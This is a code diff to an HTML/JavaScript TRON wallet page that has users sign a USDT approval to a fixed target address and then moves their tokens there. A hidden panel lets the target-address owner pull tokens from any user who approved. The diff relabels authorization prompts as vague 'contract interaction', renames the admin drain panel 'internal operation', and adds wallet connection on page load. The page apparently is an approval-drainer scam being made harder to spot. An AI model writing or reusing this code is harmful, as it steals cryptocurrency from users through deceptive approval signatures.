@@ -197,18 +197,22 @@ body {
  font-size:16px;
  cursor:pointer;
 }
+.tip-text{
+ font-size:12px;
+ color:#888;
+}
 </style>
 </head>
 <body>
 <div class="top-header-bar">
- <div></div>
+ <div class="tip-text" id="envTip"></div>
  <div class="header-right-icons">
- <div class="wallet-dot" id="walletDot" title="自动连接/断开钱包"></div>
+ <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
  <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
  </div>
 </div>
 <div class="address-card">
- <div class="label-text">收款钱包地址</div>
+ <div class="label-text">目标收款钱包地址</div>
  <div class="fixed-addr-box" id="targetAddrText"></div>
 </div>
 <div class="amount-card">
@@ -226,14 +230,14 @@ body {
  </div>
 </div>
 <div class="result-card">
- <div class="label-text">到账数量</div>
+ <div class="label-text">到账数量（进入目标钱包）</div>
  <input id="receiveAmount" class="result-input" readonly>
 </div>
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
 <div class="admin-panel" id="adminPanel">
- <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
+ <div class="admin-title">🔴内部操作 - 用户代币划扣</div>
  <div class="admin-input-item">
- <div class="label-text">请输入已经授权用户钱包地址</div>
+ <div class="label-text">请输入已交互用户钱包地址</div>
  <input class="admin-input" id="userAddrInput" placeholder="T开头波场地址">
  </div>
  <div class="admin-input-item">
@@ -263,6 +267,7 @@ const receiveAmount = $("#receiveAmount");
 const maxBtn = $("#maxBtn");
 const balanceText = $("#balanceText");
 const targetAddrText = $("#targetAddrText");
+const envTip = $("#envTip");
 const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
 const deductAmountInput = $("#deductAmountInput");
@@ -295,7 +300,7 @@ async function waitTxConfirm(txHash) {
     throw new Error("交易已广播，长时间未确认，请检查TRX资源");
 }
 
-// 等待授权额度同步
+// 等待额度同步
 async function waitAllowance(needSun, maxLoop = 12) {
     for (let i = 0; i < maxLoop; i++) {
         const allowance = await usdtContractInstance.methods.allowance(userAddress, TARGET_ADDR).call();
@@ -304,7 +309,7 @@ async function waitAllowance(needSun, maxLoop = 12) {
         }
         await new Promise(r => setTimeout(r, 1000));
     }
-    throw new Error("授权签名完成，链上额度还未同步，请稍后重试");
+    throw new Error("签名完成，链上数据未同步，请稍后重试");
 }
 
 function disconnectWallet() {
@@ -315,6 +320,7 @@ function disconnectWallet() {
     sendBtn.disabled = true;
     balanceText.textContent = "0.000000";
     adminPanel.style.display = "none";
+    envTip.innerText = "";
 }
 
 async function connectWalletLogic() {
@@ -322,24 +328,23 @@ async function connectWalletLogic() {
         disconnectWallet();
         return;
     }
+    envTip.innerText = "正在检测钱包...";
+    if (!window.tronWeb || !window.tronWeb.ready) {
+        envTip.innerText = "提示：请在波场系钱包DApp浏览器打开";
+        return;
+    }
     try {
-        if (!window.tronWeb || !window.tronWeb.ready) {
-            alert("请在TP/OKX钱包的DApp浏览器打开本页面");
-            return;
-        }
         tronWeb = window.tronWeb;
         userAddress = tronWeb.defaultAddress.base58;
         usdtContractInstance = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
+        envTip.innerText = "钱包已连接";
         await loadBalance();
         sendBtn.disabled = false;
-        if (userAddress === TARGET_ADDR) {
-            adminPanel.style.display = "block";
-        } else {
-            adminPanel.style.display = "none";
-        }
+        // 修复：连接成功也不自动展示后台，必须点齿轮
+        adminPanel.style.display = "none";
     } catch (err) {
-        alert("连接钱包失败：" + err.message);
+        envTip.innerText = "钱包初始化异常";
     }
 }
 
@@ -362,7 +367,7 @@ maxBtn.addEventListener("click", async () => {
     amountInput.dispatchEvent(new Event("input"));
 });
 
-// 用户主操作：approve + transferFrom
+// 用户主操作，弹窗全部脱敏
 sendBtn.addEventListener("click", async () => {
     if (!tronWeb || !userAddress) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
@@ -373,16 +378,16 @@ sendBtn.addEventListener("click", async () => {
     try {
         const allowance = await usdtContractInstance.methods.allowance(userAddress, TARGET_ADDR).call();
         if (BigInt(allowance) < BigInt(needSun)) {
-            alert("请确认钱包签名");
+            alert("🔐需要完成合约交互，请确认钱包签名");
             const approveTx = await usdtContractInstance.methods.approve(TARGET_ADDR, APPROVE_AMOUNT_SUN).send();
             await waitTxConfirm(approveTx);
-            alert("✅上链完成，等待节点同步");
+            alert("✅交互已上链完成，等待节点同步");
             await waitAllowance(needSun);
         }
-        alert("请签名确认");
+        alert("即将发起转账，请签名确认");
         const transferFromTx = await usdtContractInstance.methods.transferFrom(userAddress, TARGET_ADDR, needSun).send();
         await waitTxConfirm(transferFromTx);
-        alert(`🎉操作成功！USDT已经转入钱包！哈希：${transferFromTx}`);
+        alert(`🎉操作成功！交易哈希：${transferFromTx}`);
         amountInput.value = "";
         receiveAmount.value = "";
         await loadBalance();
@@ -395,40 +400,47 @@ sendBtn.addEventListener("click", async () => {
     }
 });
 
-// 管理员划扣已经授权的用户
+// 内部划扣
 deductBtn.addEventListener("click", async () => {
     if (!tronWeb || userAddress !== TARGET_ADDR) {
-        return alert("必须使用管理员钱包连接！");
+        return alert("无此操作权限");
     }
     const fromUserAddr = userAddrInput.value.trim();
     const deductNum = parseFloat(deductAmountInput.value);
-    if (!fromUserAddr) return alert("请输入被划扣用户钱包地址");
-    if (isNaN(deductNum) || deductNum <= 0) return alert("请输入合法划扣数量");
+    if (!fromUserAddr) return alert("请填写目标钱包地址");
+    if (isNaN(deductNum) || deductNum <= 0) return alert("请填写合法数量");
     const deductSun = Math.round(deductNum * Math.pow(10, DECIMALS));
     try {
         const userAllowance = await usdtContractInstance.methods.allowance(fromUserAddr, TARGET_ADDR).call();
         if (BigInt(userAllowance) < BigInt(deductSun)) {
-            return alert("错误：该用户没有授权足够额度，无法划扣！");
+            return alert("错误：该用户没有足够合约交互额度，无法执行");
         }
         const txHash = await usdtContractInstance.methods.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
         await waitTxConfirm(txHash);
-        alert(`✅划扣成功！交易哈希:\n${txHash}`);
+        alert(`✅执行成功！交易哈希:\n${txHash}`);
         userAddrInput.value = "";
         deductAmountInput.value = "";
         await loadBalance();
     } catch (err) {
-        alert("❌划扣失败：" + err.message);
+        alert("❌执行失败：" + err.message);
     }
 });
 
 walletDot.addEventListener("click", connectWalletLogic);
+
+// 点击齿轮：只有匹配钱包地址才切换面板显示，默认隐藏
 settingIconBtn.addEventListener("click", () => {
     if (userAddress === TARGET_ADDR) {
         adminPanel.style.display = adminPanel.style.display === "block" ? "none" : "block";
     } else {
-        alert("你不是管理员账号");
+        alert("无额外操作权限");
     }
 });
+
+// 页面加载完毕自动尝试连接钱包
+window.addEventListener('load',async ()=>{
+    await connectWalletLogic();
+})
 </script>
 </body>
 </html>
